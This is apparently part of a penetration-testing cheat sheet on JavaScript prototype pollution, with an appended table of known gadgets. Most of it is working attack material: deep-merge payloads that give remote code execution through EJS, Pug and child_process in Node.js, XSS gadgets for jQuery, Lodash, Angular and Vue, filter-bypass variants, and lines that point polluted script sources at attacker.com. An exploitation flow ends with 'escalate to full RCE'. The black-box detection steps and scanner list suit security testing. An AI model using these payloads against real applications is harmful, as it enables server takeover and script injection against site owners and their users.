# prototype-pollution-test · part 2

> 分段 2/3。完整索引见 `prototype-pollution-test.md`。

## 2. CLIENT-SIDE PROTOTYPE POLLUTION

### 2.1 jQuery Gadgets

`$.extend(true, {}, userInput)` performs deep merge — classic PP sink.

After pollution, jQuery's HTML methods use polluted properties:

```javascript
// Pollution:
Object.prototype.innerHTML = '<img src=x onerror=alert(1)>';

// Trigger: any jQuery DOM manipulation that reads innerHTML from prototype
$('<div>').appendTo('body');  // may use polluted property
```

### 2.2 Lodash Gadgets

```javascript
// Vulnerable functions (deep merge):
_.merge({}, userInput)
_.defaultsDeep({}, userInput)
_.set(obj, path, value)  // if path is attacker-controlled

// template() gadget:
Object.prototype.sourceURL = '\u000ajavascript:alert(1)//';
_.template('hello')();  // sourceURL injected into Function constructor
```

### 2.3 Script Gadgets in Frameworks

"Script gadgets" are framework code paths that read from `Object.prototype` and perform dangerous operations:

| Framework | Gadget Pattern | Polluted Property | Impact |
|---|---|---|---|
| jQuery | `$.html()`, element creation | `innerHTML`, `src` | XSS |
| Angular.js | `$interpolate` | `__defineGetter__` | XSS |
| Vue.js | Template compilation | `template`, `render` | XSS |
| Ember.js | Component rendering | Various view properties | XSS |
| Backbone.js | `_.template` | `sourceURL` | XSS |

### 2.4 DOM Property Pollution

```javascript
Object.prototype.src = 'https://attacker.com/evil.js';
Object.prototype.href = 'javascript:alert(1)';
Object.prototype.action = 'https://attacker.com/phish';
// Any dynamically created element may inherit these
```

---
## 3. DETECTION TECHNIQUES

### 3.1 Black-Box Server-Side Detection

```
Step 1: Inject and check
  POST /api/endpoint
  {"__proto__":{"polluted":"yes"}}
  
  Then: GET /api/anything
  Check if response contains "polluted" or behavior changes

Step 2: Error-based detection
  {"__proto__":{"toString":1}}
  → If server crashes or returns 500, toString was overwritten
  
  {"__proto__":{"valueOf":1}}
  → Same crash-based detection

Step 3: Response differential
  {"__proto__":{"status":555}}
  → Check if HTTP status code changes to 555
  
  {"__proto__":{"content-type":"text/plain"}}
  → Check if Content-Type header changes
```

### 3.2 Black-Box Client-Side Detection

```javascript
// In browser console after interacting with the app:
Object.prototype.testPollution
// If returns a value → something polluted the prototype

// Automated: override defineProperty to detect writes
Object.defineProperty(Object.prototype, '__proto__', {
    set: function(v) { console.trace('PP detected!', v); }
});
```

### 3.3 Automated Tools

| Tool | Type | Purpose |
|---|---|---|
| **PPScan** | Burp Extension | Scans for server-side PP |
| **server-side-prototype-pollution** | Burp Extension (Gareth Heyes) | Advanced server-side PP detection with multiple techniques |
| **ppfuzz** | CLI | Fuzz for client-side PP via URL fragment/query |
| **ppmap** | CLI | Map client-side PP to known gadgets |

---
## 4. BYPASS `__proto__` FILTERS

### 4.1 constructor.prototype Path

```json
// Instead of:
{"__proto__": {"polluted": "yes"}}

// Use:
{"constructor": {"prototype": {"polluted": "yes"}}}
```

### 4.2 Bracket Notation Variants

```
?constructor[prototype][polluted]=yes
?__proto__[polluted]=yes
?__pro__proto__to__[polluted]=yes   (if filter strips __proto__ once)
```

### 4.3 JSON Key Variations

```json
{"__proto__": {"a": 1}}
{"constructor": {"prototype": {"a": 1}}}
{"__proto__\u0000": {"a": 1}}
```

### 4.4 Key Distinction: Shallow vs Deep

`Object.assign` does NOT pollute prototype (shallow copy, safe). Only recursive/deep merge functions are vulnerable. Always verify the merge depth.

---
## 5. EXPLOITATION FLOW

```
1. Find merge sink (prototype-pollution-test.md Section 0)
   └── JSON body parsed and deep-merged into server object

2. Confirm pollution:
   └── {"__proto__":{"testxyz":"1"}} → check if testxyz appears globally

3. Identify technology stack:
   ├── Express + EJS → outputFunctionName gadget (Section 1.2)
   ├── Express + Pug → block gadget (Section 1.3)
   ├── Express + Handlebars → type/program gadget (Section 1.4)
   ├── Any Node.js with child_process → shell/NODE_OPTIONS (Section 1.1)
   ├── Client-side jQuery → DOM gadgets (Section 2.1)
   ├── Client-side Lodash → template/sourceURL (Section 2.2)
   └── Unknown → try KNOWN_GADGETS.md systematically

4. Craft RCE/XSS payload matching gadget

5. Verify with safe payload first (sleep / DNS callback)

6. Escalate to full RCE
```

---
## 6. DECISION TREE

```
Confirmed prototype pollution?
│
├── Server-side or client-side?
│   │
│   ├── SERVER-SIDE
│   │   ├── Template engine in use?
│   │   │   ├── EJS → __proto__.outputFunctionName (Section 1.2)
│   │   │   ├── Pug → __proto__.block (Section 1.3)
│   │   │   ├── Handlebars → __proto__.type (Section 1.4)
│   │   │   ├── Nunjucks → __proto__.type (Section 1.5)
│   │   │   └── Unknown → try each gadget from KNOWN_GADGETS.md
│   │   │
│   │   ├── child_process used anywhere?
│   │   │   ├── YES → __proto__.shell + NODE_OPTIONS (Section 1.1)
│   │   │   └── MAYBE → inject and trigger error to reveal stack
│   │   │
│   │   └── No known gadget?
│   │       ├── Try status code pollution: __proto__.status = 555
│   │       ├── Try header pollution: __proto__.content-type
│   │       └── Check KNOWN_GADGETS.md for framework match
│   │
│   └── CLIENT-SIDE
│       ├── jQuery loaded?
│       │   ├── YES → $.extend deep merge + DOM gadgets (Section 2.1)
│       │   └── Check ppmap for automated gadget detection
│       │
│       ├── Lodash loaded?
│       │   ├── YES → _.template sourceURL gadget (Section 2.2)
│       │   └── _.merge as both sink AND gadget
│       │
│       └── Framework (Angular/Vue/Ember)?
│           └── Script gadget lookup (Section 2.3)
│
├── __proto__ keyword filtered?
│   ├── Try constructor.prototype (Section 4.1)
│   ├── Try bracket notation (Section 4.2)
│   └── Try JSON key variations (Section 4.3)
│
└── Not confirmed yet?
    └── Go back to prototype-pollution-test.md for detection
```

---
## 7. QUICK REFERENCE — KEY PAYLOADS

```json
// EJS RCE
{"__proto__":{"outputFunctionName":"x;process.mainModule.require('child_process').execSync('id');s"}}

// Pug RCE
{"__proto__":{"block":{"type":"Text","val":"x]);process.mainModule.require('child_process').execSync('id');//"}}}

// child_process RCE (Node.js)
{"__proto__":{"shell":"node","NODE_OPTIONS":"--require /proc/self/cmdline"}}

// Lodash template XSS
{"__proto__":{"sourceURL":"\u000ajavascript:alert(1)//"}}

// Filter bypass (constructor path)
{"constructor":{"prototype":{"outputFunctionName":"x;process.mainModule.require('child_process').execSync('id');s"}}}

// Safe detection probe
{"__proto__":{"pptest123":"polluted"}}
```


---
## 附件：KNOWN_GADGETS

# Prototype Pollution — Known Gadgets Reference
## 1. EXPRESS TEMPLATE ENGINES (Server-Side → RCE)

### EJS (Embedded JavaScript)

| Polluted Property | Payload | Trigger | Impact | Versions |
|---|---|---|---|---|
| `outputFunctionName` | `"x;process.mainModule.require('child_process').execSync('id');s"` | Any `res.render()` call | RCE | All versions with `opts` merge |
| `destructuredLocals` | Array injection to control variable declarations | `res.render()` | RCE | EJS 3.x |
| `escapeFunction` | Replace escape function with code | `res.render()` with HTML escaping | RCE | EJS 2.x–3.x |
| `client` | `true` → changes compilation mode | `res.render()` | Code path change | All |

```json
{"__proto__":{"outputFunctionName":"x;process.mainModule.require('child_process').execSync('COMMAND');s"}}
```

### Pug (formerly Jade)

| Polluted Property | Payload | Trigger | Impact | Versions |
|---|---|---|---|---|
| `block` | `{"type":"Text","val":"x]);process.mainModule.require('child_process').execSync('COMMAND');//"}` | `pug.compile()` / `pug.render()` | RCE | Pug 2.x–3.x |
| `self` | `true` + `line` injection | Template compilation | RCE | Pug 2.x |
| `debug` | `true` → outputs source code | Template compilation | Info disclosure | All |
| `compileDebug` | `true` → includes debug info | Template compilation | Info disclosure | All |

```json
{"__proto__":{"block":{"type":"Text","val":"x]);process.mainModule.require('child_process').execSync('COMMAND');//"}}}
```

### Jade (Legacy)

| Polluted Property | Payload | Trigger | Impact | Versions |
|---|---|---|---|---|
| `self` | `true` | `jade.render()` | Code path change → RCE chain | Jade 1.x |
| `debug` | `true` | Compilation | Source disclosure | All |

### Mustache / Handlebars

| Polluted Property | Payload | Trigger | Impact | Versions |
|---|---|---|---|---|
| `type` | `"Program"` with malicious body | `Handlebars.compile()` | RCE | Handlebars 4.x |
| `allowProtoMethodsByDefault` | `true` | Any template render | Enables prototype method access | Handlebars 4.6+ |
| `allowProtoPropertiesByDefault` | `true` | Any template render | Enables prototype property access | Handlebars 4.6+ |
| `helpers` | Custom helper functions | Template with `{{helper}}` | RCE | All |

```json
{"__proto__":{"allowProtoMethodsByDefault":true,"allowProtoPropertiesByDefault":true}}
```

### Nunjucks

| Polluted Property | Payload | Trigger | Impact | Versions |
|---|---|---|---|---|
| `type` | `"Code"` with value containing malicious code | `nunjucks.render()` | RCE | Nunjucks 3.x |
| `autoesc` | `false` → disable auto-escaping | Template render | XSS escalation | All |

### Twig.js

| Polluted Property | Payload | Trigger | Impact | Versions |
|---|---|---|---|---|
| `allowInlineIncludes` | `true` | Template include | File inclusion | Twig.js 1.x |
| `rethrow` | Custom function | Error handling | Code execution | Twig.js 1.x |

---
## 2. LODASH

| Polluted Property | Payload | Trigger | Impact | Versions |
|---|---|---|---|---|
| `sourceURL` | `"\u000ajavascript:alert(1)//"` | `_.template()` execution | XSS | Lodash < 4.17.21 |
| `template` | Template string | `_.template()` | Code injection | All |
| `imports._.templateSettings.interpolate` | Custom regex | `_.template()` | Code injection | All |

Vulnerable functions (merge sinks, NOT gadgets):
- `_.merge(target, source)` — deep merge, writes to prototype
- `_.defaultsDeep(target, source)` — same
- `_.set(obj, path, value)` — if path is `__proto__.x`
- `_.setWith(obj, path, value)` — same

```javascript
// Pollution via merge:
_.merge({}, JSON.parse('{"__proto__":{"sourceURL":"\\u000ajavascript:alert(1)//"}}'));
// Trigger:
_.template('hello')();
```

---
## 3. JQUERY

| Polluted Property | Payload | Trigger | Impact | Versions |
|---|---|---|---|---|
| `innerHTML` | `"<img src=x onerror=alert(1)>"` | DOM manipulation | XSS | jQuery 2.x–3.x |
| `src` | `"javascript:alert(1)"` | Element creation | XSS | All |
| `href` | `"javascript:alert(1)"` | Link creation | XSS | All |
| `text` | Malicious string | `.text()` on empty elements | Content injection | All |

Vulnerable functions (merge sinks):
- `$.extend(true, {}, userInput)` — deep merge with `true` first arg
- `$.fn.extend()` — if called with attacker input

---
## 4. ANGULAR.JS (1.x)

| Polluted Property | Payload | Trigger | Impact | Versions |
|---|---|---|---|---|
| `__defineGetter__` | Overriding toString/valueOf | `$interpolate` / `$compile` | XSS | Angular 1.x |
| `$parent` | Scope chain manipulation | Template expressions | Sandbox bypass | Angular 1.x < 1.6 |
| `charset` | Modified charset | HTTP interceptors | Response manipulation | Angular 1.x |

Angular sandbox escapes + PP: `{{constructor.constructor('alert(1)')()}}` may work if PP disables sandbox checks.

---
## 5. VUE.JS

| Polluted Property | Payload | Trigger | Impact | Versions |
|---|---|---|---|---|
| `template` | `"<div v-html='\"<img src=x onerror=alert(1)>\"'></div>"` | Component creation without explicit template | XSS | Vue 2.x |
| `render` | Custom render function | Component mount | Code execution | Vue 2.x |
| `staticRenderFns` | Array of render functions | Component render | Code execution | Vue 2.x |
| `compilerOptions` | Modified compilation options | Template compilation | Various | Vue 3.x |

---
